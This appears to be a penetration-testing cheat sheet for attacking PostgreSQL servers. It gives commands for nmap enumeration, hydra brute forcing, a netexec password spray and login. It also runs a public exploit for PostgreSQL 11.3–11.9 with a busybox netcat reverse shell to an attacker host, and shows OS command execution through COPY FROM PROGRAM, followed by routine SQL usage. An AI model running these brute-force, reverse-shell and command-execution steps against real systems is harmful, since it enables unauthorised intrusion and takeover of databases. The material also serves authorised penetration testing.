# PostgreSQL

Port 5432, 5433

### 1) Nmap scan

    nmap -sV -p 5432,5433 --script "postgresql-info,postgresql-user-enum,postgresql-ssl" IP

### 2) Brute force

    hydra -L users.txt -P passwords.txt -s 5432 IP postgresql

### 3) Password Spray

    netexec postgres -d <DB_NAME> -u <USER> -p <PASSWORD> <ip>

### 4) Login

-W: Prompt for password

    psql -h <ip> -p 5432 -U <USER> -W

### 5) RCE (PostgreSQL DB versions 11.3 - 11.9)

    python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"

### 6) Code Execution

    DROP TABLE IF EXISTS cmd_exec;  
    CREATE TABLE cmd_exec(cmd_output text);  
    COPY cmd_exec FROM PROGRAM 'id';  
    SELECT * FROM cmd_exec;  
    DROP TABLE IF EXISTS cmd_exec;

### 7) Database Usage

List all databases

    \l

Switch to a specific database

    \c DB_NAME

List all tables in the current database

    \dt

View the schema of a specific table

    \d TABLE_NAME

Query the contents of a specific table

    SELECT * FROM <TABLE_NAME>;

Execute a query to find specific data, such as users with a particular attribute

    SELECT * FROM users WHERE attribute = 'value';

Example command to list all tables and their columns

    SELECT table_name, column_name, data_type
    FROM information_schema.columns
    WHERE table_schema = 'public';

Execute an SQL command to create a new table

    CREATE TABLE test_table (
        id SERIAL PRIMARY KEY,
        name VARCHAR(100),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );

Insert data into a table

    INSERT INTO test_table (name) VALUES ('example_data');

Update data in a table

    UPDATE test_table SET name = 'updated_data' WHERE id = 1;

Delete data from a table

    DELETE FROM test_table WHERE id = 1;
